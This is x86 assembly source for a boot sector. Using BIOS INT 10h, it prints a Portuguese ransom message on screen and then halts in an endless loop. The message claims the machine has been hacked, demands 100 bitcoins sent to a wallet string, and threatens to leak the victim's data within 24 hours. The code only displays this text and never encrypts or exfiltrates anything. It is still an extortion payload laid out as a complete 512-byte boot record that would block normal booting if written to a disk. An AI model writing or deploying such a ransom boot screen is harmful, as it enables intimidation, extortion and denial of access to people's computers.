xor ax, ax
mov ds, ax
mov es, ax
mov ss, ax

;INT 10,13 - Write String versões do BIOS de 1/10/86
;AH = 13h
;AL = modo de gravação (veja as configurações de bits abaixo)
;   = 0 string é somente caracteres, atributo em BL, cursor não movido
;   = 1 string é somente chard, atributo em BL, cursor movido
;   = 2 string contém caracteres e atributos, cursor não movido
;   = 3 string contém caracteres e atributos, cursor movido
;BH = número da página de vídeo
;BL = atributo se modo 0 ou 1 (bit AL 1=0)
;CX = comprimento da string (ignorando atributos)
;DH = coordenada de linha
;DL = coordenada da coluna
;ES:BP = ponteiro para string

start:
	mov ah, 0x13
	mov al, 0x01
	mov bh, 0x00
	mov bl, 0x03
	mov cx, 0x13
	mov dh, 0x0a
	mov dl, 0x0a
	mov bp, string
	add bp, 0x7c00
	int 0x10
	
	mov ah, 0x13
	mov al, 0x01
	mov bh, 0x00
	mov bl, 0x03
	mov cx, 0x0a
	mov dh, 0x0b
	mov dl, 0x0d
	mov bp, string2
	add bp, 0x7c00
	int 0x10

	mov ah, 0x13
	mov al, 0x01
	mov bh, 0x00
	mov bl, 0x03
	mov cx, 0x44
	mov dh, 0x0c
	mov dl, 0x0a
	mov bp, string3
	add bp, 0x7c00
	int 0x10

	mov ah, 0x13
	mov al, 0x01
	mov bh, 0x00
	mov bl, 0x02
	mov cx, 0x36
	mov dh, 0x0d
	mov dl, 0x0b
	mov bp, string4
	add bp, 0x7c00
	int 0x10

	jmp $

string: db 'Meu nome eh carlos', 0x0a,0x0d
string2: db 'Te Hackeei', 0x0a,0x0d
string3: db 'Voce precisa enviar 100 bitcoins pra carteira 4a8swf49saf84as6tg8', 0x0a,0x0d
string4: db 'caso nao envie em 24 horas seus dados serao divulgados', 0x0a,0x0d
times 510-($ - $$) db 0x00
dw 0xAA55
